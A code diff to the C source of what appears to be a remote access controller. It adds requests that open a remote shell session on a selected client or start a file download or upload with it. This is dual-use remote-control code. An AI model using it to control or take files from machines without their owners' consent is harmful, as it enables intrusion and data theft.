@@ -116,6 +116,8 @@ void *accept_worker(void *arg)
 
 int exec_shell_command()
 {
+    xrequest_t req;
+    req.xr_flag = XRFLAG_SHELL;
     uint16_t cid;
     scanf("%hu", &cid);
     xclient_t *target_client = xclient_list_find(&list, cid);
@@ -124,8 +126,8 @@ int exec_shell_command()
         printf("[!] Client with %hu id didn't find!\r\n", cid);
         return -1;
     }
-
     // // REQUEST A NEW SHELL SESSION
+    xrequest_send(&target_client->socket, &req);
 
     if (xterminal_enable_raw_mode() == -1)
     {
@@ -173,6 +175,8 @@ int exec_shell_command()
 }
 int exec_download_command()
 {
+    xrequest_t req;
+    req.xr_flag = XRFLAG_FILE_SHARING;
     uint16_t cid;
     scanf("%hu", &cid);
     xclient_t *target_client = xclient_list_find(&list, cid);
@@ -181,6 +185,8 @@ int exec_download_command()
         printf("[!] Client with %hu id isn't found!\n", cid);
         return -1;
     }
+
+
     xfile_t file;
     char client_file_path[256];
     char save_location[256];
@@ -191,6 +197,8 @@ int exec_download_command()
         printf("[!] failed to open %s: %s\r\n", save_location, strerror(errno));
         return -1;
     }
+    // Request file sharing from client
+    xrequest_send(&target_client->socket, &req);
     if (make_fhandshake(&target_client->socket, client_file_path, &file, XFMODE_DOWNLOAD) == -1)
     {
         printf("[!] failed to handshake\r\n");
@@ -208,6 +216,8 @@ int exec_download_command()
 }
 int exec_upload_command()
 {
+    xrequest_t req;
+    req.xr_flag = XRFLAG_FILE_SHARING;
     uint16_t cid;
     scanf("%hu", &cid);
     xclient_t *target_client = xclient_list_find(&list, cid);
@@ -216,6 +226,7 @@ int exec_upload_command()
         printf("[!] Client with %hu id isn't found!\n", cid);
         return -1;
     }
+
     xfile_t file;
     char file_path[256];
     char client_save_location[256];
@@ -226,6 +237,9 @@ int exec_upload_command()
         printf("[!] failed to open %s: %s\r\n", file_path, strerror(errno));
         return -1;
     }
+
+    xrequest_send(&target_client->socket, &req);
+    
     if (make_fhandshake(&target_client->socket, client_save_location, &file, XFMODE_UPLOAD) == -1)
     {
         printf("[!] failed to handshake\r\n");
